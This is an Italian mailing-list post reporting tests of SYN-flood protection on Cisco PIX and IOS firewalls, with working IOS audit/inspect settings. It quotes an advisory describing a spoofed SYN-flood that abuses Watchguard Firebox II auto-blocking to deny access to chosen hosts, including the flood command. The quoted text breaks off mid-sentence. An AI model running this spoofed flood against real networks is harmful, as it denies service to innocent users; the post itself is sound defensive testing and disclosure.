Con Cisco PIX Firewall, dalla 5.2(1) e' stata introdotta la feature di
"tcp intercept" gia' presente su IOS/IPFW che dovrebbe proteggere la reti
dietro a tali sistemi  da synflood.
Adesso da test da me effettuati:

Cisco PIX Firewall 5.2(1) con dietro un webserver, se SynFloodato
pesantemente si comporta come il " Watchguard Firebox II " descritto da
raptor.( Bello schifo vero?)

Cisco IOS IPFW 12.1(4) con dietro un webserver e "ip tcp
intercept" abilitato in tutti i modi possibili (watch mode, drop mode,
etc) sembra continuare a funzionare, ma al salire del carico del router,
ogni tanto manda un RST anche a connessioni stabilite.

Cisco IOS IPFW 12.1(4) con dietro un webserver e "ip  audit" e ip inspect
attivato:
ip audit signature 3050 list 99 (Signature del SynFlood)
ip audit name bloccasyn attack list 99 action alarm drop reset
access-list 99 permit any
e
ip inspect audit-trail
ip inspect max-incomplete low 10
ip inspect max-incomplete high 20
ip inspect one-minute low 10
ip inspect one-minute high 20
ip inspect tcp idle-time 300

Funziona a meraviglia, gestendo il synflood in modo eccellente, anche con
una macchina davanti al Router ( un 3600 con 8mb di flash, e 32mb di
ram) . Il WebServer risponde sempre a non si ritrova una valanga di
SYN_RECV facendo netstat -na .

Sarei curioso di sapere i risultati di test fatti synflooddando servizi
nelle service network, utilizzando altri tipi di Firewall.

> Watchguard Firebox is a series of hw firewalls providing a lot of nice
> features and protection for small offices and so on. I've made all my

> The problem comes with the "flooding/scanning detection and port blocking"
> feature. The firewall detects a lot of common port scanning techniques,
> along with floods, and temporarily prohibit access to his network from the
> IP address source of the scan/flood. Now, what happens if we perform a
> carefully crafted spoofed syn-flood? Simple, we can deny traffic to the
> network protected by Watchguard Firebox, from any IP we want.
> Let's look at the following example (IP addresses were censored to
> protect the innocent:):
>
> Our boxes:
> * narcissism (the attacker - we obviosly need root privs to send spoofed
>   packets)
> * web, xxx.xx.28.3 (protected by Watchguard Firebox II)
> * dns, xxx.xxx.87.2 (our test machine, connecting to the web)
>
> dns$ telnet xxx.xx.28.3 80
> Trying xxx.xx.28.3...
> Connected to xxx.xxxxx.xx.
> Escape character is '^]'.
>
> [ok, we can access the web server... let's trying the DoS from narcissism]
> narcissism# ./syn-flood -s xxx.xxx.87.2 -t xxx.xx.28.3.111 -a 1000
>
> [after the syn flood, on the xxx.xxx.87.2 box]
> dns$ telnet xxx.xx.28.3 80
> Trying xxx.xx.28.3...
>
> [no way, we can't connect]
>
> As you can see, we can deny access to the Firebox-protected network from
